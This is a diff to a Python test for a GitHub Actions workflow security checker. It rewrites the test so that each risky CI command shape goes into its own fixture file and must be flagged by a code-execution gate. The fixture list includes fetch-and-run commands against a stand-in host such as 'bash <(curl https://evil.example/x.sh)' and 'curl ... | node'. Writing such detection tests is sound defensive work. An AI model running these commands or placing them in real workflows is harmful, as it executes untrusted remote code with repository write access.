@@ -151,10 +151,10 @@ def test_bypass_fixtures_r3_git_fetch_fork_sarif_wget_bashc(tmp_path):
 
 
 def test_bypass_fixtures_r5_witness_family(tmp_path):
-    """Round-5 verifier executed witnesses: each flagged shape must trip the
-    code-execution gate (fixture h = single var: only the exec shape varies;
-    i = foreign fork caller with a job-level map overriding inherited writes,
-    isolating the workflow-level SARIF exemption)."""
+    """Round-5/6 verifier witnesses, ONE SHAPE PER FILE: each shape must
+    independently trip the code-execution gate (a shared file would let any
+    one recognized shape mask the others). Fixture i.yml isolates the
+    workflow-level SARIF exemption (foreign fork + job-level map)."""
     shapes = [
         'git -C src fetch origin refs/pull/7/head && git -C src checkout FETCH_HEAD && make test',
         'git -c protocol.version=2 clone https://github.com/example/repo.git',
@@ -164,19 +164,20 @@ def test_bypass_fixtures_r5_witness_family(tmp_path):
         'bash <(curl https://evil.example/x.sh)',
         'source <(curl https://evil.example/x.sh)',
         'curl -o x.sh https://evil.example/x.sh && sh x.sh',
+        'wget -O x.sh https://evil.example/x.sh && sh x.sh',
         'curl https://evil.example/x.py | python3',
+        'curl https://evil.example/x.js | node',
         'git pull origin refs/pull/7/head',
+        'git -c protocol.version=2 pull origin main',
         'npx -y pkg@latest run-tests',
         'pip install git+https://github.com/example/repo.git',
     ]
-    lines = []
     for i, s in enumerate(shapes):
-        lines.append(
-            f"  step{i}:\n    runs-on: ubuntu-latest\n    steps:\n      - run: {s}\n"
+        (tmp_path / f"h{i}.yml").write_text(
+            "on: [pull_request]\npermissions:\n  contents: write\njobs:\n"
+            "  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+            f"      - run: {s}\n"
         )
-    (tmp_path / "h.yml").write_text(
-        "on: [pull_request]\npermissions:\n  contents: write\njobs:\n" + "\n".join(lines)
-    )
     (tmp_path / "i.yml").write_text(
         "on: [pull_request]\n"
         "permissions:\n  contents: read\n  security-events: write\n"
@@ -185,6 +186,10 @@ def test_bypass_fixtures_r5_witness_family(tmp_path):
     )
     findings = cwp.check(tmp_path)
     caught = {f.split(":")[0] for f in findings}
-    assert {"h.yml", "i.yml"} <= caught, findings
-    # h.yml must be caught via the code-execution gate, not the missing-map rule
-    assert any("h.yml" in f for f in findings)
+    expected = {f"h{i}.yml" for i in range(len(shapes))} | {"i.yml"}
+    missed = sorted(expected - caught)
+    assert not missed, f"shapes not detected: {missed}"
+    # Every finding for the h* files must come from the code-execution gate,
+    # not the missing-map rule (all h* files declare explicit maps).
+    h_findings = [f for f in findings if f.split(":")[0].startswith("h")]
+    assert h_findings, findings
